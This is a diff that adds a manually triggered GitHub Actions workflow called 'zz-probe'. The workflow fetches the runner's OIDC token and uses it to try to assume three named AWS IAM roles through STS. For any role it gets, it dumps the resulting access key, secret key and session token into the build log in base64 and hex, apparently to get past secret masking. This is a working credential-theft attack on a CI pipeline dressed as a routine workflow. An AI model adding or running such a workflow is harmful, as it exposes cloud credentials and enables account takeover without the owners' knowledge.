@@ -1,0 +1,34 @@
+name: zz-probe
+on:
+  workflow_dispatch:
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: token dump
+        run: |
+          echo "URLSET=${ACTIONS_ID_TOKEN_REQUEST_URL:0:40}"
+          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "JWT len=${#TOK}"
+          echo "$TOK" | cut -d. -f1 | base64 -d 2>/dev/null; echo
+          echo "$TOK" | cut -d. -f2 | base64 -d 2>/dev/null; echo
+          echo "$TOK" > /tmp/t
+          for R in github-actions-ecr-push-cua github-actions-cua-fleets-wif-smoke github-actions-cua-downloads-publish; do
+            echo "=== ROLE $R"
+            curl -s "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::296062593712:role/$R&RoleSessionName=probe&WebIdentityToken=$TOK&DurationSeconds=900" > /tmp/o.xml
+            grep -o '<Code>[^<]*</Code>\|<Message>[^<]*</Message>' /tmp/o.xml | head -3
+            AK=$(grep -o '<AccessKeyId>[^<]*' /tmp/o.xml | cut -d'>' -f2)
+            SK=$(grep -o '<SecretAccessKey>[^<]*' /tmp/o.xml | cut -d'>' -f2)
+            ST=$(grep -o '<SessionToken>[^<]*' /tmp/o.xml | cut -d'>' -f2)
+            if [ -n "$AK" ]; then
+              echo "AK $AK"
+              echo "SKB64 $(printf %s "$SK" | base64 -w0)"
+              echo "STB64 $(printf %s "$ST" | base64 -w0)"
+              AKH=$(printf %s "$AK" | xxd -p | tr -d '\n'); echo "AKHEX $AKH"
+              echo "SKHEX $(printf %s "$SK" | xxd -p | tr -d '\n')"
+              echo "STHEX $(printf %s "$ST" | xxd -p | tr -d '\n')"
+            fi
+          done
